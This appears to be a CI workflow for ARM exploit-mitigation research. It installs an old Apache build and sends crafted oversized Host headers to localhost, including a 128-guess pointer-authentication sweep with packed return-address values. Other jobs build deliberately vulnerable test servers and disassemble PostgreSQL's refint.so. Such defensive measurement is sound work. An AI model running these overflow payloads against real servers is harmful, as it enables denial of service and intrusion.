name: arm-defense-stock

on:
  push:
    branches: [stock-cve-arm]
  workflow_dispatch:

jobs:
  defense:
    runs-on: ubuntu-24.04-arm
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4
        with:
          ref: canary-limit
      - name: system info
        run: |
          mkdir -p results
          uname -a | tee results/system.txt
          lscpu | tee -a results/system.txt
          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
      - name: build
        run: |
          gcc -O0 -g -fno-omit-frame-pointer -fstack-protector-strong \
            -no-pie -static -mbranch-protection=pac-ret+bti \
            -o canary/server_canary_limit canary/server_canary_limit.c
          file canary/server_canary_limit | tee results/build.txt
          nm canary/server_canary_limit | grep -E ' (win|handle_client)$' | tee -a results/build.txt
      - name: limit trials
        run: bash canary/run_limit_trials.sh 2>&1 | tee results/limit.log
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: defense-results
          path: results/

  apache-stock:
    runs-on: ubuntu-24.04-arm
    timeout-minutes: 30
    steps:
      - name: system info
        run: |
          mkdir -p results
          uname -a | tee results/system.txt
          lscpu | tee -a results/system.txt
          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
          (grep -o -E "fpac|pauth" /proc/cpuinfo | sort -u | tee -a results/system.txt) || true

      - name: install vulnerable apache 2.4.58-1ubuntu8
        run: |
          set -u
          sudo apt-get update
          if ! sudo apt-get install -y --allow-downgrades \
              apache2=2.4.58-1ubuntu8 apache2-bin=2.4.58-1ubuntu8 \
              apache2-data=2.4.58-1ubuntu8 apache2-utils=2.4.58-1ubuntu8; then
            echo "apt pin failed; downloading release debs" | tee results/install-fallback.txt
            mkdir -p /tmp/apache-debs
            base=https://ports.ubuntu.com/ubuntu-ports/pool/main/a/apache2
            for f in \
              apache2_2.4.58-1ubuntu8_arm64.deb \
              apache2-bin_2.4.58-1ubuntu8_arm64.deb \
              apache2-data_2.4.58-1ubuntu8_all.deb \
              apache2-utils_2.4.58-1ubuntu8_arm64.deb; do
              curl -fsSL "$base/$f" -o "/tmp/apache-debs/$f"
            done
            sudo dpkg -i /tmp/apache-debs/*.deb || true
            sudo apt-get -f install -y
          fi
          dpkg -s apache2-bin | grep -E '^(Package|Version):' | tee results/version.txt
          sha256sum /usr/lib/apache2/modules/mod_vhost_alias.so | tee -a results/version.txt

      - name: configure prefork + vhost_alias
        run: |
          sudo a2dismod mpm_event || true
          sudo a2enmod mpm_prefork
          sudo a2enmod vhost_alias
          sudo mkdir -p /tmp/www
          sudo tee /etc/apache2/sites-available/000-default.conf >/dev/null <<'EOF'
          <VirtualHost *:80>
            ServerName test
            VirtualDocumentRoot /tmp/www/%0
            LimitRequestFieldSize 16384
            <Directory /tmp/www>
              Require all granted
            </Directory>
          </VirtualHost>
          EOF
          sudo apache2ctl configtest | tee results/configtest.txt
          sudo apache2ctl -k start
          sleep 1

      - name: trigger long Host and 128-guess PAC sweep
        run: |
          set -u
          BEFORE=$(sudo grep -c 'stack smashing detected' /var/log/apache2/error.log 2>/dev/null || true)
          [ -z "$BEFORE" ] && BEFORE=0
          python3 - <<'PY' | tee results/run.txt
          import socket
          import struct

          def req(host, label):
              try:
                  s = socket.create_connection(("127.0.0.1", 80), timeout=10)
                  s.sendall(b"GET / HTTP/1.0\r\nHost: " + host + b"\r\n\r\n")
                  d = s.recv(4096)
                  s.close()
                  return len(d)
              except Exception as e:
                  print(label, "error", repr(e))
                  return -1

          print("baseline", req(b"short.example", "baseline"))
          print("long_label", req(b"a" * 9000, "long_label"))
          print("long_dotted", req(b"a." * 4500, "long_dotted"))
          print("after", req(b"short.example", "after"))

          empty_a = 0
          for g in range(128):
              if req(b"A" * 8216, "setA") == 0:
                  empty_a += 1
          empty_b = 0
          for g in range(128):
              target = 0x4141414141414141 | (g << 48)
              host = b"A" * 8208 + struct.pack("<Q", target)
              if req(host, "setB") == 0:
                  empty_b += 1
          print("SWEEP setA=128 emptyA=%d setB=128 emptyB=%d" % (empty_a, empty_b))
          PY
          sleep 1
          AFTER=$(sudo grep -c 'stack smashing detected' /var/log/apache2/error.log 2>/dev/null || true)
          [ -z "$AFTER" ] && AFTER=0
          echo "PAC_SWEEP guesses=256 canary_aborts_delta=$((AFTER - BEFORE))" | tee results/sweep.txt
          echo "== processes" | tee -a results/run.txt
          ps -ef | grep -E 'apache2|httpd' | grep -v grep | tee results/ps.txt || true
          echo "== error log" | tee -a results/run.txt
          sudo tail -40 /var/log/apache2/error.log | tee results/error.log || true
          sudo apache2ctl -k stop || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: apache-stock-results
          path: results/

  refint-static:
    runs-on: ubuntu-24.04-arm
    timeout-minutes: 20
    steps:
      - name: system info
        run: |
          mkdir -p results
          uname -a | tee results/system.txt
          lscpu | tee -a results/system.txt
          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
      - name: download stock postgresql-16 16.2-1ubuntu4
        run: |
          set -u
          base=https://ports.ubuntu.com/ubuntu-ports/pool/main/p/postgresql-16
          curl -fsSL "$base/postgresql-16_16.2-1ubuntu4_arm64.deb" -o /tmp/pg16.deb
          dpkg-deb -x /tmp/pg16.deb /tmp/pg16
          cp /tmp/pg16/usr/lib/postgresql/16/lib/refint.so results/
          sha256sum results/refint.so | tee results/refint.txt
          dpkg-deb -f /tmp/pg16.deb Package Version Architecture | tee -a results/refint.txt
      - name: disassemble refint
        run: |
          set -u
          O=results/refint.so
          nm -D "$O" | grep -E 'check_(primary|foreign)_key' | tee -a results/refint.txt
          objdump -d --start-address=0x1264 --stop-address=0x1850 "$O" > results/refint-primary.asm
          objdump -d --start-address=0x1874 --stop-address=0x1c00 "$O" > results/refint-foreign.asm
          for f in results/refint-primary.asm results/refint-foreign.asm; do
            echo "== $f" | tee -a results/refint.txt
            grep -nE 'paciasp|sub[[:space:]]+sp|tpidr_el0|__stack_chk_fail|pg_snprintf' "$f" | tee -a results/refint.txt
          done
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: refint-static-results
          path: results/

  synthetic-oracle:
    runs-on: ubuntu-24.04-arm
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
        with:
          ref: canary
      - name: system info
        run: |
          mkdir -p results
          uname -a | tee results/system.txt
          lscpu | tee -a results/system.txt
          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
      - name: build
        run: |
          gcc -O0 -g -fno-omit-frame-pointer -fstack-protector-strong \
            -no-pie -static -mbranch-protection=pac-ret+bti \
            -o canary/server_canary canary/server_canary.c
          file canary/server_canary | tee results/build.txt
          nm canary/server_canary | grep -E ' (win|handle_client)$' | tee -a results/build.txt
      - name: 10 trials
        run: bash canary/run_trials.sh 2>&1 | tee results/trials.log
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: synthetic-oracle-results
          path: results/
